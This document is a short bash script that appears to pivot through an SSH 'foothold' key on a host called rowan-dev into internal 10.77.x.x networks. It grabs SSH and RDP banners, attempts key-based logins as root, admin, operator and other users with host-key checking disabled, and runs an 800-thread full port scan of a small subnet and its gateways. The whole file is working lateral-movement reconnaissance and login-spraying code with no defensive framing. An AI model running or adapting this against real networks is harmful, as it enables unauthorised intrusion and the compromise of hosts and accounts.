#!/bin/bash
SSH="ssh -i $HOME/.ssh/keplerops-foothold -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=8 rowan-dev"
$SSH 'echo "== ssh banner tests"
for ip in 10.77.53.1 10.77.54.1 10.77.55.1 10.77.56.1 10.77.50.1; do
 echo "-- $ip"; timeout 5 bash -c "exec 3<>/dev/tcp/$ip/22; head -c 100 <&3" 2>&1 | head -1
done
echo "== rdp banner"
for ip in 10.77.53.1 10.77.54.1 10.77.55.1 10.77.56.1; do echo "-- $ip"; timeout 5 bash -c "exec 3<>/dev/tcp/$ip/3389; head -c 40 <&3 | xxd | head -3" 2>&1; done
echo "== ssh key auth attempts"
for ip in 10.77.53.1 10.77.54.1 10.77.55.1 10.77.56.1; do
 for u in rowan cinder root admin operator; do
  r=$(timeout 8 ssh -i ~/.ssh/keplerops-foothold -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 $u@$ip "hostname; id" 2>&1 | tail -1)
  echo "$u@$ip -> $r"
 done
done
echo "== full scan 10.77.55.0/29 + gateways"
timeout 120 python3 - <<PY
import socket, concurrent.futures
ips=["10.77.53.1","10.77.54.1","10.77.55.1","10.77.55.2","10.77.55.3","10.77.55.4","10.77.55.5","10.77.55.6","10.77.56.1"]
def t(a):
    ip,p=a
    s=socket.socket(); s.settimeout(0.5)
    try:
        s.connect((ip,p)); return f"{ip}:{p}"
    except Exception: return None
    finally: s.close()
jobs=[(ip,p) for ip in ips for p in range(1,65536)]
with concurrent.futures.ThreadPoolExecutor(800) as ex:
    for r in ex.map(t,jobs):
        if r: print(r,flush=True)
print("done")
PY' 2>&1 | tail -80
